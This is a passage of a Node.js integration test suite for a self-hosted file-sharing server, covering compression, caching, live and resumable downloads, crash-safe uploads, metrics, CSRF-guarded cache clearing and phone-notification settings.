    const gz = await s.req('GET', '/api/items', { headers: { ...h, 'Accept-Encoding': 'gzip, deflate, br' }, raw: true });
    assert.equal(gz.headers['content-encoding'], 'gzip');
    assert.equal(gz.headers.vary, 'Accept-Encoding');
    assert.ok(gz.body.length < plain.body.length / 3);
    assert.deepEqual(JSON.parse(zlib.gunzipSync(gz.body)), JSON.parse(plain.body));
    const small = await s.req('GET', '/api/me', { headers: { ...h, 'Accept-Encoding': 'gzip' } });
    assert.equal(small.headers['content-encoding'], undefined, 'under 1 KB: as is');
    const refused = await s.req('GET', '/api/items', { headers: { ...h, 'Accept-Encoding': 'gzip;q=0, identity' } });
    assert.equal(refused.headers['content-encoding'], undefined, 'q=0 means no');
    const file = await upload(s, h, 'big.txt', Buffer.from('compressible '.repeat(10_000)));
    const dl = await s.req('GET', `/api/file/${file.id}`, { headers: { ...h, 'Accept-Encoding': 'gzip' }, raw: true });
    assert.equal(dl.headers['content-encoding'], undefined, 'file bodies are never compressed');
    const ev = await openEvents(s.port, { ...h, 'Accept-Encoding': 'gzip' });
    await ev.wait('hello');
    assert.equal(ev.res.headers['content-encoding'], undefined, 'nor event streams');
    ev.close();
    // Static files: brotli (made in the background at start), versioned URLs served as immutable.
    let index;
    await waitFor(async () => (index = await s.req('GET', '/', { headers: { 'Accept-Encoding': 'gzip, br' }, raw: true })).headers['content-encoding'] === 'br', 5000);
    const html = zlib.brotliDecompressSync(index.body).toString('utf8');
    assert.equal(index.headers['cache-control'], 'no-cache');
    const m = /src="app\.js\?v=([a-f0-9]{10})"/.exec(html);
    assert.ok(m, 'scripts are referenced with ?v=<hash>');
    const appJs = fs.readFileSync(path.join(ROOT, 'public', 'app.js'));
    assert.equal(m[1], crypto.createHash('sha256').update(appJs).digest('hex').slice(0, 10), 'the first 10 hex digits of the SHA-256');
    assert.match(html, /href="style\.css\?v=[a-f0-9]{10}"/);
    assert.doesNotMatch(html, /download\/android\?v=|#i-[a-z-]+\?v=/, 'routes and anchors stay as they are');
    const versioned = await s.req('GET', `/app.js?v=${m[1]}`, { raw: true });
    assert.equal(versioned.headers['cache-control'], 'public, max-age=31536000, immutable');
    assert.equal(Buffer.compare(versioned.body, appJs), 0);
    assert.equal((await s.req('GET', '/app.js')).headers['cache-control'], 'no-cache');
    assert.equal((await s.req('GET', '/app.js?v=0000000000')).headers['cache-control'], 'no-cache', 'an old version is not immutable');
    const again = await s.req('GET', '/', { headers: { 'If-None-Match': index.headers.etag } });
    assert.equal(again.status, 304);
  } finally { await s.stop(); }
});

test('P4: a file can be downloaded while it arrives; cut off on cancel or stall; If-Range works across the finish', async () => {
  const s = await startServer('p4', 8791);
  try {
    const K = s.key;
    const desk = app(K, 'p4desk00001', 'Desk', 'windows');
    const phone = app(K, 'p4phone0001', 'Phone', 'android');
    await s.req('GET', '/api/me', { headers: phone });
    const data = crypto.randomBytes(3 * 1024 * 1024);
    const MBy = 1024 * 1024;
    let init = await post(s, '/api/uploads', { name: 'movie.mp4', size: data.length, to: ['p4phone0001'] }, desk);
    let id = init.json.id;
    assert.equal((await s.req('GET', `/api/file/${id}`)).status, 401, 'the same sign-in rules');
    assert.equal((await s.req('PUT', `/api/uploads/${id}?offset=0`, { headers: desk, body: data.subarray(0, MBy) })).json.offset, MBy);
    const head = await s.req('HEAD', `/api/file/${id}`, { headers: phone });
    assert.equal(head.status, 200);
    assert.equal(Number(head.headers['content-length']), data.length);
    const live = await streamGet(s.port, `/api/file/${id}`, phone);
    assert.equal(live.status, 200);
    assert.equal(Number(live.headers['content-length']), data.length, 'the final size up front');
    const etag = live.headers.etag;
    assert.equal(etag, `"f-${id}-${data.length}"`);
    await waitFor(() => live.bytes >= MBy, 3000);
    await sleep(200);
    assert.equal(live.bytes, MBy, 'only what has arrived');
    await s.req('PUT', `/api/uploads/${id}?offset=${MBy}`, { headers: desk, body: data.subarray(MBy, 2 * MBy) });
    await waitFor(() => live.bytes >= 2 * MBy, 3000);
    const done = await s.req('PUT', `/api/uploads/${id}?offset=${2 * MBy}`, { headers: desk, body: data.subarray(2 * MBy) });
    assert.equal(done.status, 201);
    let got = await live.done;
    assert.ok(got.complete);
    assert.equal(Buffer.compare(got.body, data), 0, 'every byte, in order');
    const finished = await s.req('HEAD', `/api/file/${id}`, { headers: phone });
    assert.equal(finished.headers.etag, etag, 'the same ETag before and after the finish');

    // A range beyond what has arrived waits for it; If-Range resumes across the finish.
    init = await post(s, '/api/uploads', { name: 'b.bin', size: data.length }, desk);
    id = init.json.id;
    await s.req('PUT', `/api/uploads/${id}?offset=0`, { headers: desk, body: data.subarray(0, 100_000) });
    const ahead = await streamGet(s.port, `/api/file/${id}`, { ...phone, Range: 'bytes=2000000-2999999' });
    assert.equal(ahead.status, 206);
    assert.equal(ahead.headers['content-range'], `bytes 2000000-2999999/${data.length}`);
    const part = await streamGet(s.port, `/api/file/${id}`, { ...phone, Range: 'bytes=0-49999' });
    got = await part.done;
    assert.equal(Buffer.compare(got.body, data.subarray(0, 50_000)), 0);
    await sleep(200);
    assert.equal(ahead.bytes, 0, 'waiting for bytes that are not there yet');
    await s.req('PUT', `/api/uploads/${id}?offset=100000`, { headers: desk, body: data.subarray(100_000) });
    got = await ahead.done;
    assert.equal(Buffer.compare(got.body, data.subarray(2_000_000, 3_000_000)), 0);
    const resumed = await s.req('GET', `/api/file/${id}`, { headers: { ...phone, Range: 'bytes=50000-', 'If-Range': part.headers.etag }, raw: true });
    assert.equal(resumed.status, 206, 'If-Range with the ETag from the live download');
    assert.equal(Buffer.compare(resumed.body, data.subarray(50_000)), 0);

    // Cancelled: cut off. Stalled for 60 s (1.5 s in tests): cut off.
    init = await post(s, '/api/uploads', { name: 'c.bin', size: data.length }, desk);
    id = init.json.id;
    await s.req('PUT', `/api/uploads/${id}?offset=0`, { headers: desk, body: data.subarray(0, 200_000) });
    const cancelled = await streamGet(s.port, `/api/file/${id}`, phone);
    await waitFor(() => cancelled.bytes >= 200_000, 3000);
    assert.equal((await s.req('DELETE', `/api/uploads/${id}`, { headers: desk })).status, 204);
    got = await cancelled.done;
    assert.equal(got.complete, false);
    assert.equal(got.body.length, 200_000);
    assert.equal((await s.req('GET', `/api/file/${id}`, { headers: phone })).status, 404);
    init = await post(s, '/api/uploads', { name: 'd.bin', size: data.length }, desk);
    id = init.json.id;
    await s.req('PUT', `/api/uploads/${id}?offset=0`, { headers: desk, body: data.subarray(0, 300_000) });
    const stalled = await streamGet(s.port, `/api/file/${id}`, phone);
    const t0 = Date.now();
    got = await stalled.done;
    assert.equal(got.complete, false);
    assert.equal(got.body.length, 300_000);
    assert.ok(Date.now() - t0 >= 1400, 'cut off only after the idle time');
    await s.req('DELETE', `/api/uploads/${id}`, { headers: desk });
    await sleep(200);
    assert.doesNotMatch(s.out, /Request failed/, 'no server error logged');
  } finally { await s.stop(); }
});

test('P5: one PUT may carry the rest of a file, and an interrupted PUT keeps what arrived', async () => {
  const s = await startServer('p5', 8791);
  try {
    const h = app(s.key, 'p5dev000001', 'Dev', 'windows');
    const info = (await s.req('GET', '/api/info', { headers: h })).json;
    for (const f of ['stream-modes', 'items-since', 'gzip', 'live-download', 'big-chunks', 'clear-cache']) assert.ok(info.features.includes(f), f);
    assert.equal(info.chunkSize, 8 * 1024 * 1024);
    assert.equal(info.maxChunkSize, info.maxUpload);
    const data = crypto.randomBytes(20 * 1024 * 1024); // more than one 8 MB chunk
    let init = await post(s, '/api/uploads', { name: 'whole.bin', size: data.length }, h);
    assert.equal(init.json.maxChunkSize, info.maxUpload);
    let r = await s.req('PUT', `/api/uploads/${init.json.id}?offset=0`, { headers: h, body: data });
    assert.equal(r.status, 201, 'the whole file in one PUT');
    // Interrupted after 2 MB: those bytes stay, and the rest follows from the offset the server reports.
    init = await post(s, '/api/uploads', { name: 'cut.bin', size: data.length }, h);
    const id = init.json.id;
    const cut = stalledPut(s.port, `/api/uploads/${id}?offset=0`, h, data.length, data.subarray(0, 2 * 1024 * 1024));
    await waitFor(async () => (await s.req('GET', `/api/uploads/${id}`, { headers: h })).json.offset === 2 * 1024 * 1024 || null, 5000).catch(() => {});
    await cut.done;
    const offset = (await s.req('GET', `/api/uploads/${id}`, { headers: h })).json.offset;
    assert.equal(offset, 2 * 1024 * 1024, 'every byte that arrived was kept');
    r = await s.req('PUT', `/api/uploads/${id}?offset=${offset}`, { headers: h, body: data.subarray(offset) });
    assert.equal(r.status, 201);
    const dl = await s.req('GET', `/api/file/${id}`, { headers: h, raw: true });
    assert.equal(Buffer.compare(dl.body, data), 0);
  } finally { await s.stop(); }
});

test('P5 CLI: big files go up in big chunks (about 4 s each, at least 64 MB) when the server allows them', async () => {
  const s = await startServer('p5cli', 8791);
  try {
    const home = homeDir('p5cli');
    const file = path.join(TMP, 'p5cli-80mb.bin');
    fs.writeFileSync(file, crypto.randomBytes(80 * 1024 * 1024));
    const r = await cli(['send', file], { home, env: { BEAM_URL: `http://127.0.0.1:${s.port}`, BEAM_KEY: s.key } });
    fs.rmSync(file, { force: true });
    assert.equal(r.code, 0, r.out);
    const h = app(s.key, 'p5clicheck1', 'Check', 'windows');
    assert.equal((await s.req('GET', '/api/metrics', { headers: h })).json.requests.putChunk.count, 2, '64 MB, then the rest: not ten 8 MB chunks');
    assert.equal((await s.req('GET', '/api/items', { headers: h })).json.items[0].size, 80 * 1024 * 1024);
  } finally { await s.stop(); }
});

test('Uploads resume from their last fsynced point after a crash, never from a tail that may be zeros', async () => {
  let s = await startServer('durable', 8791);
  const h = app(s.key, 'durdev00001', 'Dev', 'windows');
  const data = crypto.randomBytes(3 * 1024 * 1024);
  const MBy = 1024 * 1024;
  const id = (await post(s, '/api/uploads', { name: 'crash.bin', size: data.length }, h)).json.id;
  // 1 MB: past the checkpoint size (256 KB in tests), so this PUT fsyncs and saves a checkpoint.
  let r = await s.req('PUT', `/api/uploads/${id}?offset=0`, { headers: h, body: data.subarray(0, MBy) });
  assert.equal(r.json.offset, MBy);
  // 100 KB more at once: under both limits, so not fsynced yet (the reply says where to go on from).
  r = await s.req('PUT', `/api/uploads/${id}?offset=${MBy}`, { headers: h, body: data.subarray(MBy, MBy + 100_000) });
  assert.equal(r.json.offset, MBy + 100_000);
  assert.equal(JSON.parse(fs.readFileSync(path.join(s.data, 'uploads', `${id}.json`), 'utf8')).synced, MBy, 'the checkpoint is the last fsynced offset');
  // A power cut: the process dies, and past the checkpoint the file holds zeros.
  s.child.kill('SIGKILL');
  await s.exited;
  const part = path.join(s.data, 'uploads', `${id}.part`);
  fs.truncateSync(part, MBy);
  fs.appendFileSync(part, Buffer.alloc(300_000));
  s = await startServer('durable', 8791, { keep: true });
  try {
    assert.equal((await s.req('GET', `/api/uploads/${id}`, { headers: h })).json.offset, MBy, 'goes on from the checkpoint');
    assert.equal(fs.statSync(part).size, MBy, 'the doubtful tail is cut off');
    assert.match(s.out, /goes on from its last saved point/);
    r = await s.req('PUT', `/api/uploads/${id}?offset=${MBy + 100_000}`, { headers: h, body: data.subarray(MBy + 100_000, MBy + 110_000) });
    assert.equal(r.status, 409, 'a client that goes on from the old reply learns the durable offset');
    assert.equal(r.json.offset, MBy);
    r = await s.req('PUT', `/api/uploads/${id}?offset=${MBy}`, { headers: h, body: data.subarray(MBy) });
    assert.equal(r.status, 201);
    const dl = await s.req('GET', `/api/file/${id}`, { headers: h, raw: true });
    assert.equal(Buffer.compare(dl.body, data), 0, 'every byte as sent');
    // A clean stop makes whatever arrived durable, so a restart doesn't cut anything off.
    const id2 = (await post(s, '/api/uploads', { name: 'stop.bin', size: 500_000 }, h)).json.id;
    assert.equal((await s.req('PUT', `/api/uploads/${id2}?offset=0`, { headers: h, body: data.subarray(0, 100_000) })).json.offset, 100_000);
    await s.req('POST', '/api/admin/shutdown', { headers: { Authorization: `Bearer ${s.key}` } });
    await s.exited;
    s = await startServer('durable', 8791, { keep: true });
    assert.equal((await s.req('GET', `/api/uploads/${id2}`, { headers: h })).json.offset, 100_000);
  } finally { await s.stop(); }
});

test('A chunk refused before its body is read closes the connection: a 64 MB PUT at the wrong offset is not read', async () => {
  const s = await startServer('refuse', 8791);
  try {
    const h = app(s.key, 'refusedev01', 'Dev', 'windows');
    const size = 64 * 1024 * 1024;
    const id = (await post(s, '/api/uploads', { name: 'big.bin', size }, h)).json.id;
    const block = Buffer.alloc(1024 * 1024, 7);
    const t0 = Date.now();
    const result = await new Promise(resolve => {
      let written = 0;
      let status = 'reset'; // (the connection may be cut while the client is still sending, before it reads the 409)
      let connection = null;
      const done = () => resolve({ status, connection, ms: Date.now() - t0 });
      const r = http.request({
        host: '127.0.0.1', port: s.port, method: 'PUT', path: `/api/uploads/${id}?offset=12345`, agent: false,
        headers: { ...h, 'Content-Type': 'application/octet-stream', 'Content-Length': size },
      }, res => {
        status = res.statusCode;
        connection = res.headers.connection;
        res.resume();
        res.on('end', done);
      });
      r.on('error', done);
      const pump = () => {
        while (written < size) {
          written += block.length;
          if (!r.write(block)) return r.once('drain', pump);
        }
        r.end();
      };
      pump();
    });
    assert.ok(result.status === 409 || result.status === 'reset', `${result.status}`);
    if (result.status === 409) assert.equal(result.connection, 'close');
    assert.ok(result.ms < 3000, `answered in ${result.ms} ms`);
    await sleep(300);
    const read = (await s.req('GET', '/api/metrics', { headers: h })).json.requests.putChunk.bytesIn;
    assert.ok(read < 16 * 1024 * 1024, `the server read ${read} bytes of the 64 MB`);
    assert.equal((await s.req('GET', `/api/uploads/${id}`, { headers: h })).json.offset, 0, 'the upload is untouched');
    // A refused JSON request that was read in full keeps its connection (only unread bodies close it).
    const agent = new http.Agent({ keepAlive: true, maxSockets: 1 });
    const ask = () => new Promise(resolve => {
      const r = http.request({ host: '127.0.0.1', port: s.port, method: 'POST', path: '/api/uploads', agent, headers: json(h) }, res => {
        res.resume();
        res.on('end', () => resolve({ status: res.statusCode, reused: r.reusedSocket, connection: res.headers.connection }));
      });
      r.end(JSON.stringify({ name: 'x', size: -1 }));
    });
    assert.equal((await ask()).status, 400);
    const again = await ask();
    assert.equal(again.status, 400);
    assert.ok(again.reused, 'kept alive');
    agent.destroy();
  } finally { await s.stop(); }
});

test('Every 401 names its Beam (serverId) and clears nothing; POST /api/clear-cache clears the browser cache, same-origin only', async () => {
  const s = await startServer('clear401', 8791);
  try {
    const K = s.key;
    const { serverId } = (await s.req('GET', '/api/hello')).json;
    const refused = async (label, headers) => {
      const r = await s.req('GET', '/api/me', { headers });
      assert.equal(r.status, 401, label);
      assert.equal(r.json.serverId, serverId, `${label}: the 401 names the Beam that sent it`);
      assert.equal(r.headers['clear-site-data'], undefined, `${label}: a 401 clears nothing by itself`);
    };
    await refused('no credentials', {});
    await refused('an unknown token', { Authorization: 'Bearer bt_nosuchtoken0000000000000000000000000000000' });
    await refused('a stale cookie', cookie('bt_stalecookie000000000000000000000000000000', 'clearbr0001'));
    let r = await s.req('POST', '/api/text', { headers: { ...cookie(K), 'Content-Type': 'application/json', Origin: 'https://elsewhere.example' }, body: '{"text":"x"}' });
    assert.equal(r.status, 403);
    assert.equal(r.headers['clear-site-data'], undefined, 'nor a 403');
    // After "sign out all other devices" the old master key is refused: still a plain 401.
    assert.equal((await post(s, '/api/security/sign-out-others', {}, app(K, 'clearapp001', 'Desk'))).status, 200);
    await refused('a revoked master key', app(K, 'clearapp002', 'Laptop'));
    // The page asks for the cache to go once it has confirmed the 401 and wiped its own data.
    r = await s.req('POST', '/api/clear-cache', { headers: { 'Sec-Fetch-Site': 'same-origin' } });
    assert.equal(r.status, 204);
    assert.equal(r.headers['clear-site-data'], '"cache"');
    assert.equal(r.headers['cache-control'], 'no-store');
    assert.equal((await s.req('POST', '/api/clear-cache')).status, 204, 'no fetch metadata (not a browser): allowed, it only affects the caller');
    for (const [label, headers] of [['cross-site', { 'Sec-Fetch-Site': 'cross-site' }], ['same-site', { 'Sec-Fetch-Site': 'same-site' }], ['typed address', { 'Sec-Fetch-Site': 'none' }], ['foreign origin', { Origin: 'https://elsewhere.example' }]]) {
      r = await s.req('POST', '/api/clear-cache', { headers });
      assert.equal(r.status, 403, label);
      assert.equal(r.json.reason, 'csrf', label);
      assert.equal(r.headers['clear-site-data'], undefined, label);
    }
    assert.equal((await s.req('GET', '/api/clear-cache')).status, 401, 'only POST');
  } finally { await s.stop(); }
});

test('P4: a live download that stops reading never has the upload piled up in memory for it', async () => {
  const s = await startServer('p4paused', 8791);
  try {
    const K = s.key;
    const desk = app(K, 'p4pdesk0001', 'Desk', 'windows', from('100.64.84.1'));
    const pc = app(K, 'p4ppc000001', 'Far PC', 'windows', from('100.64.84.2'));
    await s.req('GET', '/api/me', { headers: pc });
    const memory = async () => (await s.req('GET', '/api/metrics', { headers: desk })).json.process.external;
    const before = await memory();
    const size = 256 * 1024 * 1024;
    const id = (await post(s, '/api/uploads', { name: 'big.bin', size, to: ['p4ppc000001'] }, desk)).json.id;
    // The far PC starts the live download, then stops reading (a slow link): its socket fills up while 256 MB
    // arrive at loopback speed.
    const reader = await new Promise((resolve, reject) => {
      const r = http.request({ host: '127.0.0.1', port: s.port, path: `/api/file/${id}`, headers: pc, agent: false }, res => { res.pause(); resolve(r); });
      r.on('error', () => {});
      r.on('error', reject);
      r.end();
    });
    const put = new Promise((resolve, reject) => {
      const r = http.request({ host: '127.0.0.1', port: s.port, method: 'PUT', path: `/api/uploads/${id}?offset=0`, agent: false, headers: { ...desk, 'Content-Type': 'application/octet-stream', 'Content-Length': size } }, res => { res.resume(); res.on('end', () => resolve(res.statusCode)); });
      r.on('error', reject);
      const block = Buffer.alloc(1024 * 1024, 3);
      let sent = 0;
      const pump = () => { while (sent < size) { sent += block.length; if (!r.write(block)) return r.once('drain', pump); } r.end(); };
      pump();
    });
    let peak = before;
    let finished = false;
    put.then(() => { finished = true; }, () => { finished = true; });
    while (!finished) {
      peak = Math.max(peak, await memory());
      await sleep(100);
    }
    assert.equal(await put, 201, 'a reader that stops never slows the upload down');
    const grew = (peak - before) / 1024 / 1024;
    assert.ok(grew < 128, `the server's memory grew by ${Math.round(grew)} MB for a 256 MB upload`);
    assert.doesNotMatch(s.out, /MaxListenersExceeded/);
    reader.destroy();
  } finally { await s.stop(); }
});

test('Store: a send during a burst of other changes waits for one save, not for the burst to end', async () => {
  const s = await startServer('storeburst', 8791, { env: { BEAM_MAX_ITEMS: '2000' } });
  try {
    const K = s.key;
    const desk = app(K, 'sbdesk00001', 'Desk', 'windows', from('100.64.85.1'));
    const phone = app(K, 'sbphone0001', 'Phone', 'android', from('100.64.85.2'));
    await s.req('GET', '/api/me', { headers: phone });
    const ids = [];
    for (let i = 0; i < 400; i++) ids.push((await sendText(s, desk, `backlog ${i} `.repeat(200), ['sbphone0001'])).id);
    let next = 0;
    const acker = async () => { while (next < ids.length) await s.req('POST', `/api/items/${ids[next++]}/ack`, { headers: phone }); };
    const t0 = Date.now();
    const burst = Promise.all(Array.from({ length: 6 }, acker)).then(() => Date.now() - t0);
    await sleep(50);
    const sends = [];
    while (next < ids.length - 40) {
      const t = Date.now();
      await sendText(s, desk, 'while the phone catches up');
      sends.push(Date.now() - t);
    }
    const burstMs = await burst;
    sends.sort((a, b) => a - b);
    const median = sends[sends.length >> 1];
    assert.ok(median < Math.max(150, burstMs / 4), `a send took ${median} ms (median of ${sends.length}) during a ${burstMs} ms burst of acks`);
  } finally { await s.stop(); }
});

test('Keep-alive outlasts the 90 s that tailscaled keeps an idle connection', async () => {
  const s = await startServer('keepalive', 8791);
  try {
    const agent = new http.Agent({ keepAlive: true });
    const header = await new Promise((resolve, reject) => {
      http.get({ host: '127.0.0.1', port: s.port, path: '/api/hello', agent }, res => { res.resume(); resolve(res.headers['keep-alive']); }).on('error', reject);
    });
    agent.destroy();
    assert.equal(header, 'timeout=100');
  } finally { await s.stop(); }
});

// The server process's open OS handles (files, sockets…), or null where that can't be counted.
function openHandles(pid) {
  if (IS_WIN) return Number(execFileSync('powershell.exe', ['-NoProfile', '-Command', `(Get-Process -Id ${pid}).HandleCount`], { windowsHide: true }).toString().trim());
  if (process.platform === 'linux') return fs.readdirSync(`/proc/${pid}/fd`).length;
  return null;
}

test('P4: live downloads the client drops release their file at once (no leaked handles), also after a cancel', async () => {
  const s = await startServer('liveleak', 8791);
  try {
    const K = s.key;
    const desk = app(K, 'lkdesk00001', 'Desk', 'windows', from('100.64.86.1'));
    const pc = app(K, 'lkpc0000001', 'PC', 'windows', from('100.64.86.2'));
    await s.req('GET', '/api/me', { headers: pc });
    const MBy = 1024 * 1024;
    const id = (await post(s, '/api/uploads', { name: 'big.bin', size: 128 * MBy }, desk)).json.id;
    assert.equal((await s.req('PUT', `/api/uploads/${id}?offset=0`, { headers: { ...desk, 'Content-Type': 'application/octet-stream' }, body: Buffer.alloc(64 * MBy, 1) })).status, 200);
    await sleep(500);
    const before = openHandles(s.child.pid);
    // 150 live readers each take a few MB of the 64 MB that arrived, then hang up (some while the server is between
    // a disk read and its write: the case that used to leave the request waiting forever with the file open).
    for (let i = 0; i < 150; i++) {
      const stopAt = (1 + (i % 7)) * MBy + ((i * 7919) % MBy);
      await new Promise(resolve => {
        const r = http.request({ host: '127.0.0.1', port: s.port, path: `/api/file/${id}`, headers: pc, agent: false }, res => {
          let got = 0;
          res.on('data', c => { got += c.length; if (got >= stopAt) { r.destroy(); resolve(); } });
          res.on('close', resolve);
        });
        r.on('error', () => resolve());
        r.end();
      });
    }
    await sleep(1500);
    if (before !== null) {
      const after = openHandles(s.child.pid);
      assert.ok(after - before <= 10, `server handles ${before} -> ${after} after 150 dropped live downloads`);
    }
    assert.equal((await s.req('DELETE', `/api/uploads/${id}`, { headers: desk })).status, 204);
    await sleep(1000);
    if (before !== null) {
      const cancelled = openHandles(s.child.pid);
      assert.ok(cancelled - before <= 10, `server handles ${before} -> ${cancelled} after the upload was cancelled`);
    }
    assert.doesNotMatch(s.out, /Request failed|MaxListenersExceeded/);
  } finally { await s.stop(); }
});

test('P6: metrics: process, requests per route, streams and saves, for owners', async () => {
  const s = await startServer('p6', 8791);
  try {
    const h = app(s.key, 'p6dev000001', 'Dev', 'android');
    const ev = await openEvents(s.port, h, '/api/events?mode=background');
    await ev.wait('hello');
    await sendText(s, h, 'measure me');
    await s.req('GET', '/api/items', { headers: h });
    await sleep(300);
    assert.equal((await s.req('GET', '/api/metrics')).status, 401);
    let m = (await s.req('GET', '/api/metrics', { headers: h })).json;
    assert.ok(m.process.rss > 0 && m.process.heapUsed > 0 && m.process.cpu.user > 0 && m.uptime >= 0);
    assert.ok(m.process.loop.utilization > 0);
    assert.equal(m.process.loop.p50, null, 'delay is sampled only once someone asks');
    assert.equal(m.requests.listItems.count, 1);
    assert.ok(m.requests.listItems.p50 > 0 && m.requests.listItems.p95 >= m.requests.listItems.p50);
    assert.ok(m.requests.listItems.bytes > 0);
    assert.ok(m.requests.postText.bytesIn > 0);
    assert.equal(m.requests.events, undefined, 'streams are counted apart');
    const st = m.streams.find(x => x.device === 'p6dev000001');
    assert.equal(st.mode, 'background');
    assert.equal(st.ping, 180);
    assert.ok(st.writes >= 1 && st.bytes > 0 && st.events >= 1);
    assert.ok(m.store.writes >= 1 && m.store.fsyncs >= 1 && m.store.files['items.json'].bytes > 0);
    await sleep(300);
    m = (await s.req('GET', '/api/metrics', { headers: h })).json;
    assert.ok(m.process.loop.p50 >= 0 && m.process.loop.p99 >= m.process.loop.p50, 'sampling now');
    ev.close();
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- 1.5 phone notifications (plan/notify.md)

// A phone, two PCs (the desktop shows phone notifications once switched on, the laptop doesn't) on separate machines.
async function notifySetup(name, opts = {}) {
  const s = await startServer(name, 8791, opts);
  const K = s.key;
  const phone = app(K, 'ntphone0001', 'Robin Phone', 'android', { ...from('100.64.87.1'), 'X-Beam-App-Version': '1.5.0' });
  const desk = app(K, 'ntdesk00001', 'Desktop', 'windows', from('100.64.87.2'));
  const laptop = app(K, 'ntlaptop001', 'Laptop', 'windows', from('100.64.87.3'));
  for (const h of [phone, desk, laptop]) await s.req('GET', '/api/me', { headers: h });
  const on = (h, value = true) => s.req('PUT', '/api/devices/me/settings', { headers: json(h), body: JSON.stringify({ phoneNotifications: value }) });
  return { s, K, phone, desk, laptop, on };
}

const note = (fields = {}) => ({
  app: 'com.whatsapp', appName: 'WhatsApp', icon: null, title: 'Mom', text: 'Dinner at 7?', lines: ['Mom: Dinner at 7?'],
  conversation: 'Family', when: 1790723000000, silent: false,
  actions: [{ id: 'a0', title: 'Reply', reply: true }, { id: 'a1', title: 'Mark as read' }], ...fields,
});
const putNote = (s, h, key, body) => s.req('PUT', `/api/phone/notifications/${key}`, { headers: json(h), body: JSON.stringify(body) });
const PNG_SIG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
const png = (seed, size = 200) => { const b = Buffer.alloc(size, seed & 255); PNG_SIG.copy(b); b.writeUInt32BE(seed, 8); return b; };
const sha256 = b => crypto.createHash('sha256').update(b).digest('hex');

test('1.5 Device setting: phoneNotifications is off by default, any device sets it for any device, validated, saved', async () => {
  const { s, phone, desk, on } = await notifySetup('nt-settings');
  try {
    let list = (await s.req('GET', '/api/devices', { headers: desk })).json.devices;
    assert.ok(list.every(d => d.settings?.phoneNotifications === false), 'off by default, for every device');
    const ev = await openEvents(s.port, phone);
    await ev.wait('hello');
    assert.equal((await on(desk)).status, 204);
    await ev.wait('devices', d => d.devices.find(x => x.id === 'ntdesk00001')?.settings.phoneNotifications === true);
    assert.equal((await s.req('PUT', '/api/devices/ntlaptop001/settings', { headers: json(phone), body: JSON.stringify({ phoneNotifications: true }) })).status, 204, 'set for another device');
    list = (await s.req('GET', '/api/devices', { headers: desk })).json.devices;
    assert.equal(list.find(d => d.id === 'ntlaptop001').settings.phoneNotifications, true);
    for (const bad of [{ nope: true }, { phoneNotifications: 'yes' }, {}, { phoneNotifications: true, extra: 1 }]) {
      assert.equal((await s.req('PUT', '/api/devices/me/settings', { headers: json(desk), body: JSON.stringify(bad) })).status, 400, JSON.stringify(bad));
    }
    assert.equal((await s.req('PUT', '/api/devices/nosuchdevice1/settings', { headers: json(desk), body: '{"phoneNotifications":true}' })).status, 404);
    assert.ok((await s.req('GET', '/api/info', { headers: desk })).json.features.includes('phone-notifications'));
    assert.match(s.out, /Desktop shows phone notifications now/);
    await sleep(300);
    const saved = JSON.parse(fs.readFileSync(path.join(s.data, 'devices.json'), 'utf8'));
    assert.equal(saved.ntdesk00001.settings.phoneNotifications, true, 'a device setting, kept with the device');
    ev.close();
  } finally { await s.stop(); }
});

test('1.5 A device whose switch is flipped elsewhere follows at once on a background stream; off drops what it shows', async () => {
  const { s, phone, desk, laptop } = await notifySetup('nt-follow');
  try {
    const deskEv = await openEvents(s.port, desk, '/api/events?mode=background');
    const lapEv = await openEvents(s.port, laptop, '/api/events?mode=background');
    for (const e of [deskEv, lapEv]) await e.wait('hello');
    await sleep(400);
    const lapBefore = lapEv.events.length;
    const set = value => s.req('PUT', '/api/devices/ntdesk00001/settings', { headers: json(phone), body: JSON.stringify({ phoneNotifications: value }) });
    await set(true); // from the phone
    await deskEv.wait('devices', d => d.devices.find(x => x.id === 'ntdesk00001')?.settings.phoneNotifications === true, 1500);
    await putNote(s, phone, 'k1', note());
    await deskEv.wait('notification', d => d.id === 'ntphone0001/k1', 1000);
    await set(false);
    await deskEv.wait('notification-removed', d => d.all === true && d.device === undefined, 1000);
    await deskEv.wait('devices', d => d.devices.find(x => x.id === 'ntdesk00001')?.settings.phoneNotifications === false, 1500);
    await sleep(300);
    assert.equal(lapEv.events.length, lapBefore, "another device's background stream isn't woken for it");
    deskEv.close();
    lapEv.close();
  } finally { await s.stop(); }
});

test("1.5 A device's switch change reaches it at once and nothing older follows: a devices event held from before is dropped", async () => {
  const { s, phone, desk, laptop, on } = await notifySetup('nt-stale');
  try {
    const deskEv = await openEvents(s.port, desk, '/api/events?mode=background');
    await deskEv.wait('hello');
    const lapEv = await openEvents(s.port, laptop); // the laptop comes online: a devices event the desk's stream holds
    await lapEv.wait('hello');
    await sleep(500);
    assert.ok(!deskEv.events.some(e => e.event === 'devices'), 'held (a background stream)');
    const deskShows = e => e.data.devices.find(x => x.id === 'ntdesk00001').settings.phoneNotifications;
    // On from the desk itself (its tray checkbox); the first notification follows within the 300 ms the device list
    // waits. It must not bring the held list (desk off) after the change.
    let before = deskEv.events.length;
    assert.equal((await on(desk)).status, 204);
    assert.equal((await putNote(s, phone, 'k1', note())).status, 204);
    await deskEv.wait('notification', d => d.id === 'ntphone0001/k1', 1000);
    let after = deskEv.events.slice(before);
    assert.equal(after[0].event, 'devices', 'the new device list first, at once');
    assert.ok(after.filter(e => e.event === 'devices').every(e => deskShows(e) === true), 'nothing from before the change');
    // The 300 ms list is held again (desk on). Off from another device: only what's new reaches the desk.
    await sleep(500);
    before = deskEv.events.length;
    assert.equal((await s.req('PUT', '/api/devices/ntdesk00001/settings', { headers: json(phone), body: '{"phoneNotifications":false}' })).status, 204);
    await deskEv.wait('devices', d => d.devices.find(x => x.id === 'ntdesk00001').settings.phoneNotifications === false, 1000);
    after = deskEv.events.slice(before);
    assert.deepEqual(after[0], { event: 'notification-removed', data: { all: true } }, 'first: drop everything shown');
    assert.ok(after.filter(e => e.event === 'devices').every(e => deskShows(e) === false), 'nothing from before the change');
    // Setting the same value again changes nothing: no write.
    await sleep(500);
    before = deskEv.events.length;
    assert.equal((await s.req('PUT', '/api/devices/ntdesk00001/settings', { headers: json(phone), body: '{"phoneNotifications":false}' })).status, 204);
    await sleep(500);
    assert.equal(deskEv.events.length, before, 'no change, no wakeup');
    deskEv.close();
    lapEv.close();
  } finally { await s.stop(); }
});

